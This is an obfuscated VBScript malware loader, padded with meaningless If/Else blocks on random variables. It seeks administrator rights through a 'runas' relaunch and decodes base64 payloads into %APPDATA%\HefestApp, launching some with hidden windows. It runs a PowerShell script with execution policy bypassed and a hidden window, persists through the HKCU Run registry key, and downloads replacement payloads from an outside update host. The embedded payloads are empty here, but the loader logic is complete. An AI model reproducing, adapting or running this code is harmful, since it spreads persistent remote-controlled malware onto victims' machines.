Dim bodyX
Dim JBykoei6FN
JBykoei6FN = 77
If JBykoei6FN < 66 Then
    JBykoei6FN = JBykoei6FN + 1
Else
    JBykoei6FN = JBykoei6FN - 1
End If
bodyX=""
Dim selfDel
Dim gfxVWVUTA
gfxVWVUTA = 30
If gfxVWVUTA < 79 Then
    gfxVWVUTA = gfxVWVUTA + 1
Else
    gfxVWVUTA = gfxVWVUTA - 1
End If
selfDel="False"
Dim autostart
autostart="True"
Dim CkqcGpN
CkqcGpN = 84
If CkqcGpN < 65 Then
    CkqcGpN = CkqcGpN + 1
Else
    CkqcGpN = CkqcGpN - 1
End If
Dim autoupdate
autoupdate="True"
Dim updateurl
Dim YSX2O9ByV
YSX2O9ByV = 18
If YSX2O9ByV < 60 Then
    YSX2O9ByV = YSX2O9ByV + 1
Else
    YSX2O9ByV = YSX2O9ByV - 1
End If
updateurl="http://1.superhost.pw/109.248.201.219/update"
Dim arrFrontData
arrFrontData = Array()
Dim b2xkO9cF
b2xkO9cF = 38
If b2xkO9cF < 98 Then
    b2xkO9cF = b2xkO9cF + 1
Else
    b2xkO9cF = b2xkO9cF - 1
End If
Dim arrFrontName
arrFrontName = Array()
Dim arrBackData
Dim rtgV969
rtgV969 = 91
If rtgV969 < 33 Then
    rtgV969 = rtgV969 + 1
Else
    rtgV969 = rtgV969 - 1
End If
arrBackData = Array()
Dim arrBackName
arrBackName = Array()
Dim pLzz9nR
pLzz9nR = 83
If pLzz9nR < 31 Then
    pLzz9nR = pLzz9nR + 1
Else
    pLzz9nR = pLzz9nR - 1
End If


If Not IsAdmin() Then
Dim OfgzwTN8
OfgzwTN8 = 55
If OfgzwTN8 < 1 Then
    OfgzwTN8 = OfgzwTN8 + 1
Else
    OfgzwTN8 = OfgzwTN8 - 1
End If
    RunElevated()
Else
    MainScriptLogic()
Dim KMtwl2EHX
KMtwl2EHX = 81
If KMtwl2EHX < 1 Then
    KMtwl2EHX = KMtwl2EHX + 1
Else
    KMtwl2EHX = KMtwl2EHX - 1
End If
End If


Dim aTN9P1tL
aTN9P1tL = 93
If aTN9P1tL < 34 Then
    aTN9P1tL = aTN9P1tL + 1
Else
    aTN9P1tL = aTN9P1tL - 1
End If
Sub MainScriptLogic()
    if IsAutoStart() = False then
        For i = 0 To UBound(arrFrontName)
Dim UVusLRpZP
UVusLRpZP = 92
If UVusLRpZP < 30 Then
    UVusLRpZP = UVusLRpZP + 1
Else
    UVusLRpZP = UVusLRpZP - 1
End If
            data = arrFrontData(i)
            exe = GetFilePath(arrFrontName(i))
            DecodeBase64ToFile data, exe
Dim uLv47VxR
uLv47VxR = 64
If uLv47VxR < 8 Then
    uLv47VxR = uLv47VxR + 1
Else
    uLv47VxR = uLv47VxR - 1
End If
            ExecuteFileAsync exe, False
        Next
    end if
Dim HIA1g9DI
HIA1g9DI = 12
If HIA1g9DI < 34 Then
    HIA1g9DI = HIA1g9DI + 1
Else
    HIA1g9DI = HIA1g9DI - 1
End If

    if Not FileExists(GetPS1FilePath) or IsAutoStart() = False Then
        DecodeBase64ToFile bodyX, GetPS1FilePath
Dim Vi0Z9J3
Vi0Z9J3 = 45
If Vi0Z9J3 < 41 Then
    Vi0Z9J3 = Vi0Z9J3 + 1
Else
    Vi0Z9J3 = Vi0Z9J3 - 1
End If
    end if

    Run
Dim aHLvEQq5m
aHLvEQq5m = 80
If aHLvEQq5m < 55 Then
    aHLvEQq5m = aHLvEQq5m + 1
Else
    aHLvEQq5m = aHLvEQq5m - 1
End If

    if IsAutoStart() = False then
        if autostart = "True" Then
Dim RRNOwUr
RRNOwUr = 46
If RRNOwUr < 36 Then
    RRNOwUr = RRNOwUr + 1
Else
    RRNOwUr = RRNOwUr - 1
End If
            DoSetAutoStart
        end if
    end if
Dim VAOCgXs
VAOCgXs = 7
If VAOCgXs < 41 Then
    VAOCgXs = VAOCgXs + 1
Else
    VAOCgXs = VAOCgXs - 1
End If

    if autoupdate = "True" Then
        DoAutoUpdate
Dim TgymLrs
TgymLrs = 66
If TgymLrs < 83 Then
    TgymLrs = TgymLrs + 1
Else
    TgymLrs = TgymLrs - 1
End If
    end if

    if IsAutoStart() = False then
Dim WBE2zgVbE
WBE2zgVbE = 49
If WBE2zgVbE < 65 Then
    WBE2zgVbE = WBE2zgVbE + 1
Else
    WBE2zgVbE = WBE2zgVbE - 1
End If
        For i = 0 To UBound(arrBackName)
            data = arrBackData(i)
            exe = GetFilePath(arrBackName(i))
Dim lXTfkky
lXTfkky = 32
If lXTfkky < 51 Then
    lXTfkky = lXTfkky + 1
Else
    lXTfkky = lXTfkky - 1
End If
            DecodeBase64ToFile data, exe
            ExecuteFileAsync exe, True
        Next
Dim ISXKfas
ISXKfas = 72
If ISXKfas < 81 Then
    ISXKfas = ISXKfas + 1
Else
    ISXKfas = ISXKfas - 1
End If
    end if
End Sub

Dim E1ditRqMHO
E1ditRqMHO = 29
If E1ditRqMHO < 7 Then
    E1ditRqMHO = E1ditRqMHO + 1
Else
    E1ditRqMHO = E1ditRqMHO - 1
End If
Function GetPS1FilePath()
    Dim fso, shell, scriptPath, destFolder, destPath
    Set fso = CreateObject("Scripting.FileSystemObject")
Dim JYAgHClbM
JYAgHClbM = 2
If JYAgHClbM < 76 Then
    JYAgHClbM = JYAgHClbM + 1
Else
    JYAgHClbM = JYAgHClbM - 1
End If
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
Dim lGlaZqaL
lGlaZqaL = 97
If lGlaZqaL < 63 Then
    lGlaZqaL = lGlaZqaL + 1
Else
    lGlaZqaL = lGlaZqaL - 1
End If
    destPath = fso.BuildPath(destFolder, "body.ps1")
    CreateFolder fso, destFolder
    GetPS1FilePath = destPath   
Dim q6EF3w1hCE
q6EF3w1hCE = 48
If q6EF3w1hCE < 71 Then
    q6EF3w1hCE = q6EF3w1hCE + 1
Else
    q6EF3w1hCE = q6EF3w1hCE - 1
End If
End Function

Function GetSelfFilePath()
Dim LeIPARNX
LeIPARNX = 71
If LeIPARNX < 27 Then
    LeIPARNX = LeIPARNX + 1
Else
    LeIPARNX = LeIPARNX - 1
End If
    Dim fso, shell, scriptPath, destFolder, destPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
Dim SbfGEAy
SbfGEAy = 53
If SbfGEAy < 34 Then
    SbfGEAy = SbfGEAy + 1
Else
    SbfGEAy = SbfGEAy - 1
End If
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
    destPath = fso.BuildPath(destFolder, "holder.vbs")
Dim br8NCV0P3u
br8NCV0P3u = 59
If br8NCV0P3u < 90 Then
    br8NCV0P3u = br8NCV0P3u + 1
Else
    br8NCV0P3u = br8NCV0P3u - 1
End If
    CreateFolder fso, destFolder
    GetSelfFilePath = destPath
End Function
Dim XfhhgRY
XfhhgRY = 2
If XfhhgRY < 88 Then
    XfhhgRY = XfhhgRY + 1
Else
    XfhhgRY = XfhhgRY - 1
End If

Sub Run
    Dim shell
Dim ZabY8eT
ZabY8eT = 27
If ZabY8eT < 25 Then
    ZabY8eT = ZabY8eT + 1
Else
    ZabY8eT = ZabY8eT - 1
End If
    Set shell = CreateObject("WScript.Shell")
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath & """"
Dim UMi9wM1
UMi9wM1 = 82
If UMi9wM1 < 53 Then
    UMi9wM1 = UMi9wM1 + 1
Else
    UMi9wM1 = UMi9wM1 - 1
End If
    if IsAutoStart() = True then
        command = command & " -autostart"
    end if
Dim VnFiBfl4
VnFiBfl4 = 94
If VnFiBfl4 < 27 Then
    VnFiBfl4 = VnFiBfl4 + 1
Else
    VnFiBfl4 = VnFiBfl4 - 1
End If
    shell.Run command, 0, True
end sub

Dim puTmiZ0
puTmiZ0 = 91
If puTmiZ0 < 99 Then
    puTmiZ0 = puTmiZ0 + 1
Else
    puTmiZ0 = puTmiZ0 - 1
End If
Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
Dim oSt4Nfx5s
oSt4Nfx5s = 80
If oSt4Nfx5s < 9 Then
    oSt4Nfx5s = oSt4Nfx5s + 1
Else
    oSt4Nfx5s = oSt4Nfx5s - 1
End If
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
Dim psncrD480D
psncrD480D = 55
If psncrD480D < 35 Then
    psncrD480D = psncrD480D + 1
Else
    psncrD480D = psncrD480D - 1
End If
End Function

Sub RunElevated()
Dim BufV9J0F
BufV9J0F = 14
If BufV9J0F < 66 Then
    BufV9J0F = BufV9J0F + 1
Else
    BufV9J0F = BufV9J0F - 1
End If
    Dim objShell
    Set objShell = CreateObject("Shell.Application")

Dim Q28i0yF8b
Q28i0yF8b = 26
If Q28i0yF8b < 68 Then
    Q28i0yF8b = Q28i0yF8b + 1
Else
    Q28i0yF8b = Q28i0yF8b - 1
End If
    ' Capture command-line arguments
    Dim args
    args = ""
Dim lqMhFHT6Dc
lqMhFHT6Dc = 69
If lqMhFHT6Dc < 89 Then
    lqMhFHT6Dc = lqMhFHT6Dc + 1
Else
    lqMhFHT6Dc = lqMhFHT6Dc - 1
End If
    Dim i
    For i = 1 To WScript.Arguments.Count
        args = args & " " & WScript.Arguments(i - 1)
Dim zas92RPbV
zas92RPbV = 76
If zas92RPbV < 35 Then
    zas92RPbV = zas92RPbV + 1
Else
    zas92RPbV = zas92RPbV - 1
End If
    Next

    ' Construct the command string with the script name and arguments
Dim Yt3sitKytx
Yt3sitKytx = 41
If Yt3sitKytx < 39 Then
    Yt3sitKytx = Yt3sitKytx + 1
Else
    Yt3sitKytx = Yt3sitKytx - 1
End If
    Dim command
    command = Chr(34) & WScript.ScriptFullName & Chr(34) & args

Dim BaTjtrw
BaTjtrw = 34
If BaTjtrw < 14 Then
    BaTjtrw = BaTjtrw + 1
Else
    BaTjtrw = BaTjtrw - 1
End If
    ' Execute the script with elevated privileges
    objShell.ShellExecute "wscript.exe", command, "", "runas", 1

Dim WQHtxrDI
WQHtxrDI = 21
If WQHtxrDI < 51 Then
    WQHtxrDI = WQHtxrDI + 1
Else
    WQHtxrDI = WQHtxrDI - 1
End If
    ' Exit the script
    WScript.Quit
End Sub
Dim sqXCm4IfRU
sqXCm4IfRU = 81
If sqXCm4IfRU < 66 Then
    sqXCm4IfRU = sqXCm4IfRU + 1
Else
    sqXCm4IfRU = sqXCm4IfRU - 1
End If

Sub DoSetAutoStart()
    Dim registryKey, registryValue, command
Dim ejv8cHE
ejv8cHE = 21
If ejv8cHE < 26 Then
    ejv8cHE = ejv8cHE + 1
Else
    ejv8cHE = ejv8cHE - 1
End If
    Dim fso, shell
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
Dim jHmsXY6coH
jHmsXY6coH = 23
If jHmsXY6coH < 63 Then
    jHmsXY6coH = jHmsXY6coH + 1
Else
    jHmsXY6coH = jHmsXY6coH - 1
End If
    CopyScript fso, WScript.ScriptFullName, GetSelfFilePath

    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
Dim k6XFILd
k6XFILd = 57
If k6XFILd < 6 Then
    k6XFILd = k6XFILd + 1
Else
    k6XFILd = k6XFILd - 1
End If
    registryValue = "HefestAppVbs"
    command = "wscript.exe """ & GetSelfFilePath & """ autostart"
    shell.RegWrite registryKey & registryValue, command, "REG_SZ"
Dim sxkWTDk8
sxkWTDk8 = 36
If sxkWTDk8 < 96 Then
    sxkWTDk8 = sxkWTDk8 + 1
Else
    sxkWTDk8 = sxkWTDk8 - 1
End If

    Set shell = Nothing
    Set fso = Nothing
Dim KndPdJtJRn
KndPdJtJRn = 45
If KndPdJtJRn < 95 Then
    KndPdJtJRn = KndPdJtJRn + 1
Else
    KndPdJtJRn = KndPdJtJRn - 1
End If
End Sub

Function IsAutoStart()
Dim DnwhPW9XEa
DnwhPW9XEa = 75
If DnwhPW9XEa < 99 Then
    DnwhPW9XEa = DnwhPW9XEa + 1
Else
    DnwhPW9XEa = DnwhPW9XEa - 1
End If
    Dim args, i
    Set args = WScript.Arguments
    IsAutoStart = False
Dim K8zr85Na9
K8zr85Na9 = 69
If K8zr85Na9 < 66 Then
    K8zr85Na9 = K8zr85Na9 + 1
Else
    K8zr85Na9 = K8zr85Na9 - 1
End If
    For i = 0 To args.Count - 1
        If LCase(args.Item(i)) = "autostart" Then
            IsAutoStart = True
Dim C655X3Ob
C655X3Ob = 43
If C655X3Ob < 59 Then
    C655X3Ob = C655X3Ob + 1
Else
    C655X3Ob = C655X3Ob - 1
End If
            Exit For
        End If
    Next
Dim RWtOjsF1
RWtOjsF1 = 25
If RWtOjsF1 < 10 Then
    RWtOjsF1 = RWtOjsF1 + 1
Else
    RWtOjsF1 = RWtOjsF1 - 1
End If
End Function


Dim Id47MsLp
Id47MsLp = 94
If Id47MsLp < 61 Then
    Id47MsLp = Id47MsLp + 1
Else
    Id47MsLp = Id47MsLp - 1
End If
Sub CreateFolder(fso, folderPath)
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder(folderPath)
Dim LSLqjIkD
LSLqjIkD = 28
If LSLqjIkD < 85 Then
    LSLqjIkD = LSLqjIkD + 1
Else
    LSLqjIkD = LSLqjIkD - 1
End If
    End If
End Sub

Dim cKxlJVVMlh
cKxlJVVMlh = 14
If cKxlJVVMlh < 36 Then
    cKxlJVVMlh = cKxlJVVMlh + 1
Else
    cKxlJVVMlh = cKxlJVVMlh - 1
End If
Sub CopyScript(fso, sourcePath, destinationPath)
    fso.CopyFile sourcePath, destinationPath, True
End Sub
Dim XNqba7X7mA
XNqba7X7mA = 81
If XNqba7X7mA < 44 Then
    XNqba7X7mA = XNqba7X7mA + 1
Else
    XNqba7X7mA = XNqba7X7mA - 1
End If



Dim UfQX5t7
UfQX5t7 = 43
If UfQX5t7 < 41 Then
    UfQX5t7 = UfQX5t7 + 1
Else
    UfQX5t7 = UfQX5t7 - 1
End If
Function DoAutoUpdate()
    Dim timeout, delay, startTime, response
    timeout = DateAdd("n", 1, Now)
Dim hPrPu9j4p
hPrPu9j4p = 95
If hPrPu9j4p < 46 Then
    hPrPu9j4p = hPrPu9j4p + 1
Else
    hPrPu9j4p = hPrPu9j4p - 1
End If
    delay = 5
    startTime = Now

Dim XG6QMHr
XG6QMHr = 73
If XG6QMHr < 15 Then
    XG6QMHr = XG6QMHr + 1
Else
    XG6QMHr = XG6QMHr - 1
End If
    Do While Now < timeout
        On Error Resume Next
        Set response = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Dim PgQS7xJ
PgQS7xJ = 98
If PgQS7xJ < 67 Then
    PgQS7xJ = PgQS7xJ + 1
Else
    PgQS7xJ = PgQS7xJ - 1
End If
        response.Open "GET", updateUrl, False
        response.Send
        
Dim Uriebvp36
Uriebvp36 = 73
If Uriebvp36 < 47 Then
    Uriebvp36 = Uriebvp36 + 1
Else
    Uriebvp36 = Uriebvp36 - 1
End If
        If response.Status = 200 Then
            DecodeBase64ToFile response.responseText, GetPS1FilePath
            Exit Do
Dim hFTe8QQIdN
hFTe8QQIdN = 14
If hFTe8QQIdN < 99 Then
    hFTe8QQIdN = hFTe8QQIdN + 1
Else
    hFTe8QQIdN = hFTe8QQIdN - 1
End If
        End If
        On Error GoTo 0
        
Dim PwQdWGO
PwQdWGO = 76
If PwQdWGO < 94 Then
    PwQdWGO = PwQdWGO + 1
Else
    PwQdWGO = PwQdWGO - 1
End If
        WScript.Sleep delay * 1000
    Loop
End Function
Dim hdI57Cikid
hdI57Cikid = 8
If hdI57Cikid < 27 Then
    hdI57Cikid = hdI57Cikid + 1
Else
    hdI57Cikid = hdI57Cikid - 1
End If



Dim NCWNCRJJp
NCWNCRJJp = 94
If NCWNCRJJp < 75 Then
    NCWNCRJJp = NCWNCRJJp + 1
Else
    NCWNCRJJp = NCWNCRJJp - 1
End If
Function FileExists(filePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
Dim cZgO9fNA
cZgO9fNA = 94
If cZgO9fNA < 4 Then
    cZgO9fNA = cZgO9fNA + 1
Else
    cZgO9fNA = cZgO9fNA - 1
End If
    FileExists = fso.FileExists(filePath)
    Set fso = Nothing
End Function
Dim oLXyT5hL4B
oLXyT5hL4B = 61
If oLXyT5hL4B < 73 Then
    oLXyT5hL4B = oLXyT5hL4B + 1
Else
    oLXyT5hL4B = oLXyT5hL4B - 1
End If


Function ExecuteFileAsync(filePath, hideWindow)
Dim Mh4AQ0kS
Mh4AQ0kS = 18
If Mh4AQ0kS < 88 Then
    Mh4AQ0kS = Mh4AQ0kS + 1
Else
    Mh4AQ0kS = Mh4AQ0kS - 1
End If
    if Not IsAutoStart Then
        Dim shell, result, windowStyle
        Set shell = CreateObject("WScript.Shell")
Dim ix1lOmM
ix1lOmM = 39
If ix1lOmM < 20 Then
    ix1lOmM = ix1lOmM + 1
Else
    ix1lOmM = ix1lOmM - 1
End If
        If hideWindow Then
            windowStyle = 0 ' Hidden
        Else
Dim SnsSohj8nb
SnsSohj8nb = 77
If SnsSohj8nb < 1 Then
    SnsSohj8nb = SnsSohj8nb + 1
Else
    SnsSohj8nb = SnsSohj8nb - 1
End If
            windowStyle = 1 ' Normal
        End If
        result = shell.Run(filePath, windowStyle, False)
Dim l8RnBPs
l8RnBPs = 94
If l8RnBPs < 33 Then
    l8RnBPs = l8RnBPs + 1
Else
    l8RnBPs = l8RnBPs - 1
End If
        Set shell = Nothing
        ExecuteFileAsync = result
    end if
Dim dnqMgiq
dnqMgiq = 75
If dnqMgiq < 19 Then
    dnqMgiq = dnqMgiq + 1
Else
    dnqMgiq = dnqMgiq - 1
End If
End Function

Function GetFilePath(fileName)
Dim rg7ePMJ
rg7ePMJ = 96
If rg7ePMJ < 59 Then
    rg7ePMJ = rg7ePMJ + 1
Else
    rg7ePMJ = rg7ePMJ - 1
End If
    Dim shell, fso, scriptPath, scriptFolder, fullPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
Dim CvSac6jIc
CvSac6jIc = 73
If CvSac6jIc < 12 Then
    CvSac6jIc = CvSac6jIc + 1
Else
    CvSac6jIc = CvSac6jIc - 1
End If
    scriptPath = WScript.ScriptFullName
    scriptFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
    fullPath = fso.BuildPath(scriptFolder, fileName)
Dim OU6AYuDac
OU6AYuDac = 5
If OU6AYuDac < 2 Then
    OU6AYuDac = OU6AYuDac + 1
Else
    OU6AYuDac = OU6AYuDac - 1
End If
    CreateFolder fso, scriptFolder
    Set fso = Nothing
    GetFilePath = fullPath
Dim GfMhFijPQo
GfMhFijPQo = 96
If GfMhFijPQo < 75 Then
    GfMhFijPQo = GfMhFijPQo + 1
Else
    GfMhFijPQo = GfMhFijPQo - 1
End If
End Function


Dim qE6wb2kS
qE6wb2kS = 86
If qE6wb2kS < 43 Then
    qE6wb2kS = qE6wb2kS + 1
Else
    qE6wb2kS = qE6wb2kS - 1
End If

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
Dim sIKOeZU
sIKOeZU = 69
If sIKOeZU < 29 Then
    sIKOeZU = sIKOeZU + 1
Else
    sIKOeZU = sIKOeZU - 1
End If
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    ' Create an XML element with the base64 string
Dim vA5PAjT3
vA5PAjT3 = 40
If vA5PAjT3 < 19 Then
    vA5PAjT3 = vA5PAjT3 + 1
Else
    vA5PAjT3 = vA5PAjT3 - 1
End If
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
Dim POJ8x0za3e
POJ8x0za3e = 56
If POJ8x0za3e < 12 Then
    POJ8x0za3e = POJ8x0za3e + 1
Else
    POJ8x0za3e = POJ8x0za3e - 1
End If
    node.Text = base64String
    
    ' Get the decoded binary data
Dim Geg9vlQ9y
Geg9vlQ9y = 58
If Geg9vlQ9y < 63 Then
    Geg9vlQ9y = Geg9vlQ9y + 1
Else
    Geg9vlQ9y = Geg9vlQ9y - 1
End If
    Dim binaryData
    binaryData = node.nodeTypedValue
    
Dim uFVyB8XOx
uFVyB8XOx = 11
If uFVyB8XOx < 55 Then
    uFVyB8XOx = uFVyB8XOx + 1
Else
    uFVyB8XOx = uFVyB8XOx - 1
End If
    ' Create a binary stream object to save the binary data to a file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
Dim LkHqIBiZ
LkHqIBiZ = 95
If LkHqIBiZ < 32 Then
    LkHqIBiZ = LkHqIBiZ + 1
Else
    LkHqIBiZ = LkHqIBiZ - 1
End If
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
Dim sSJeA02HzO
sSJeA02HzO = 38
If sSJeA02HzO < 18 Then
    sSJeA02HzO = sSJeA02HzO + 1
Else
    sSJeA02HzO = sSJeA02HzO - 1
End If
    
    ' Save the binary stream to the specified output file path
    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
Dim YbVhQm4
YbVhQm4 = 42
If YbVhQm4 < 62 Then
    YbVhQm4 = YbVhQm4 + 1
Else
    YbVhQm4 = YbVhQm4 - 1
End If
    stream.Close
    
    ' Clean up
Dim dfapmfUmee
dfapmfUmee = 7
If dfapmfUmee < 81 Then
    dfapmfUmee = dfapmfUmee + 1
Else
    dfapmfUmee = dfapmfUmee - 1
End If
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
Dim j2lJMh9jV6
j2lJMh9jV6 = 81
If j2lJMh9jV6 < 58 Then
    j2lJMh9jV6 = j2lJMh9jV6 + 1
Else
    j2lJMh9jV6 = j2lJMh9jV6 - 1
End If
End Function
